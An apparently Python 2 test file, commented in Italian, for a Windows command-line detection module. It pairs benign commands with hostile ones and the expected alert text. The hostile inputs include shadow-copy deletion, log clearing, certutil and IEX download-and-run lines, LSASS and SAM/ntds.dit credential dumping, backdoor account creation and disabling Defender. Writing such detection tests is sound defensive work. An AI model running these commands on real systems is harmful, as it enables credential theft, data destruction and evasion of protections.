# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# I comandi che pesano da soli (tc_regole.comandi_noti) e il testo di PowerShell (ps_sospetto):
# per ogni riga la descrizione attesa, oppure None se non deve scattare nulla.
import tc_regole as R
casi = [
    (u'vssadmin.exe delete shadows /all /quiet', u'cancellazione delle copie shadow'),
    (u'"C:\\Windows\\System32\\vssadmin.exe" Delete Shadows /All', u'cancellazione delle copie shadow'),
    (u'wmic shadowcopy delete', u'cancellazione delle copie shadow'),
    (u'vssadmin list shadows', None),
    (u'wevtutil cl Security', u'cancellazione dei registri eventi da riga di comando'),
    (u'wevtutil.exe el', None),
    (u'bcdedit /set {default} recoveryenabled No', u'ripristino di sistema disattivato'),
    (u'certutil.exe -urlcache -split -f http://1.2.3.4/a.exe a.exe', u'download con certutil'),
    (u'certutil -decode a.txt a.exe', u'certutil usato per codificare o decodificare un file'),
    (u'certutil -hashfile a.exe SHA256', None),
    (u'curl.exe -o C:\\Users\\Public\\a.exe http://x/y', None),      # lo giudica valuta_comando (vedi regole4)
    (u'curl http://example.com/', None),
    (u'bitsadmin /transfer job http://x/a.exe c:\\a.exe', u'download o installazione da rete con uno strumento di Windows'),
    (u'msiexec /q /i http://1.2.3.4/a.msi', u'download o installazione da rete con uno strumento di Windows'),
    (u'msiexec /i C:\\setup.msi', None),
    (u'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full', u'estrazione di credenziali'),
    (u'procdump64.exe -accepteula -ma lsass.exe l.dmp', u'estrazione di credenziali'),
    (u'procdump -ma notepad.exe', None),
    (u'mim.exe sekurlsa::logonpasswords', u'estrazione di credenziali'),
    (u'reg save HKLM\\SAM sam.save', u'copia del SAM'),
    (u'reg.exe save hklm\\security sec.save', u'copia del SAM'),
    (u'reg save HKLM\\SYSTEM sys.save', u'copia del SAM'),
    (u'reg save HKLM\\SOFTWARE sw.save', None),
    (u'ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q', u'copia del SAM'),
    (u'ntdsutil "activate instance ntds" files info quit quit', None),
    (u'ntdsutil snapshot "activate instance ntds" create quit quit', u'copia del SAM'),
    (u'vssadmin create shadow /for=C:', u'creazione di una copia shadow'),
    (u'esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d c:\\x\\ntds.dit', u'copia del SAM'),
    (u'net user hacker P@ssw0rd /add', u'creazione di un account da riga di comando'),
    (u'net user hacker /add', u'creazione di un account da riga di comando'),
    (u'net1 user /add hacker P@ss', u'creazione di un account da riga di comando'),
    (u'C:\\Windows\\system32\\net.exe user hacker x /ADD /domain', u'creazione di un account da riga di comando'),
    (u'net user', None),
    (u'net user administrator', None),
    (u'dotnet user-secrets set x /add', None),
    (u'dotnet user /add', None),
    (u'net localgroup administrators hacker /add', u'utente aggiunto a un gruppo privilegiato da riga di comando'),
    (u'net localgroup "Remote Desktop Users" hacker /add', u'utente aggiunto a un gruppo privilegiato da riga di comando'),
    (u'net localgroup Administratoren hacker /add', u'utente aggiunto a un gruppo privilegiato da riga di comando'),
    (u'net localgroup administrators', None),
    (u'net localgroup users bob /add', None),
    (u'powershell Set-MpPreference -DisableRealtimeMonitoring $true', u'protezioni disattivate da riga di comando'),
    (u'powershell Add-MpPreference -ExclusionPath C:\\x', u'protezioni disattivate da riga di comando'),
    (u'sc stop WinDefend', u'antivirus fermato o disattivato da riga di comando'),
    (u'sc query WinDefend', None),
    (u'netsh advfirewall set allprofiles state off', u'protezioni disattivate da riga di comando'),
    (u'netsh advfirewall show allprofiles', None),
    (u'cipher /w:C:\\', u'cancellazione sicura o del journal'),
    (u'sdelete64.exe -p 3 file', u'cancellazione sicura o del journal'),
    (u'fsutil usn deletejournal /d c:', u'cancellazione sicura o del journal'),
    (u'cmd.exe /C whoami > C:\\Windows\\Temp\\AbCdEfGh.tmp 2>&1', u'firma di atexec'),
    (u'cmd.exe /C whoami > %windir%\\Temp\\AbCdEfGh.tmp 2>&1', u'firma di atexec'),
    (u'cmd.exe /c dir > C:\\Windows\\Temp\\out.txt 2>&1', None),
    (u'cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1700000000.123 2>&1', u'firma di Impacket'),
    (u'cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\C$\\__output 2>&1', u'firma di Impacket'),
    (u'   ', None),
    (u'', None),
]
ok = 0
for riga, atteso in casi:
    trovati = [c for _, _, c in R.comandi_noti(riga)]
    buono = (atteso is None and not trovati) or (atteso is not None and any([c.startswith(atteso) for c in trovati]))
    if buono:
        ok += 1
    else:
        print (u'DIVERSO: %r -> %r (atteso %r)' % (riga, trovati, atteso)).encode('utf-8')
print 'comandi: %d casi su %d corretti' % (ok, len(casi))
# righe di soli spazi e casi limite di valuta_comando
for riga in (u'   ', u'', u'"', u'""', u'" "', u'\t', u'a', u'\\', u'"C:\\a b\\c.exe', u'%', u'%%', u'%comspec%'):
    g = R.valuta_comando(riga)
    g2 = R.valuta_comando(riga, u'')
    R.spezza_comando(riga); R.zona(riga); R.percorso_normale(riga); R.strumento(riga); R.trova_rmm(riga)
print 'casi limite di valuta_comando: nessun errore'
# PowerShell
ps = [
    (u'Set-MpPreference -DisableRealtimeMonitoring $true', u'modifica le protezioni di Defender'),
    (u'Add-MpPreference -ExclusionPath "C:\\Temp"', u'modifica le protezioni di Defender'),
    (u'Get-MpPreference', None),
    (u'IEX (New-Object Net.WebClient).DownloadString("http://1.2.3.4/a.ps1")', u'scarica ed esegue codice'),
    (u'Invoke-Mimikatz -DumpCreds', u'script d\'attacco (Invoke-Mimikatz)'),
    (u'Uninstall-WindowsFeature -Name Windows-Defender', u'modifica le protezioni di Defender'),
]
ok = 0
for testo, atteso in ps:
    g = R.ps_sospetto(testo)
    if (g is None and atteso is None) or (g is not None and g[1] == atteso):
        ok += 1
    else:
        print (u'DIVERSO PS: %r -> %r (atteso %r)' % (testo, g, atteso)).encode('utf-8')
print 'powershell: %d casi su %d corretti' % (ok, len(ps))
